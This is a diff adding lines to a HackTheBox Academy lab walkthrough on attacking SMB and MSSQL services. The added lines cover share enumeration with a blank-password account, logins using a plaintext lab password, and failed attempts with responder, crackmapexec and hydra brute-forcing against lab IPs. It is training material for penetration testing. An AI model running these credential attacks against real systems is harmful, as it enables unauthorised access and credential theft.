@@ -1,6 +1,8 @@
 # Attacking Common Services - HARD
 
 >HackTheBox Academy Module Assessment LAB walkthrough
+[Attacking SMB](https://academy.hackthebox.com/module/116/section/1167)
+[Attacking SQL Databases](https://academy.hackthebox.com/module/116/section/1169)
 
 ## port Scan NMAP discovery
 
@@ -22,6 +24,14 @@ PORT     STATE SERVICE
 ## SMB File Shares
 
 >SMB allows the simon user with blank password to read content on file server shares.  
+
+```
+smbmap -u 'simon' -H inlanefreight.htb
+
+smbmap -u 'simon' -H inlanefreight.htb -r Home
+```  
+
+>SMB client connect with blank password.  
 
 ```
 smbclient -U 'simon' \\\\10.129.1.2\\Home
@@ -51,6 +61,9 @@ xfreerdp /v:10.129.1.2 /u:fiona /p:'48Ns72!bns74@S84NNNSl' /dynamic-resolution /
 ```
 sqsh -S 10.129.1.2 -U '.\\fiona' -P '48Ns72!bns74@S84NNNSl' -h
 ```  
+
+>In remote desktop windows session open `cmd` for command prompt.
+>run `sqlcmd` as Fiona.  
 
 >Enumerate Database and tables on MSSQL  
 
@@ -145,4 +158,25 @@ type c:\users\fiona\desktop\x.txt
 ```  
 
 [Attacking Common Services - Hard](https://academy.hackthebox.com/module/116/section/1468)  
+
+## Extra Commands
+
+>These commands did not succeed in providing any foothold, information or lateral movement.  
+
+```
+sudo responder -I tun0
+```
+
+```
+crackmapexec mssql 10.129.79.226 -u 'john' -p secrets.txt --local-auth
+``` 
+
+```
+hydra -l john -P /usr/share/wordlists/rockyou.txt 10.129.27.28 mssql 
+```  
+
+```
+sqsh -S 10.129.27.28 -U john -P '48Ns72!bns74@S84NNNSl' -h
+```  
+
 
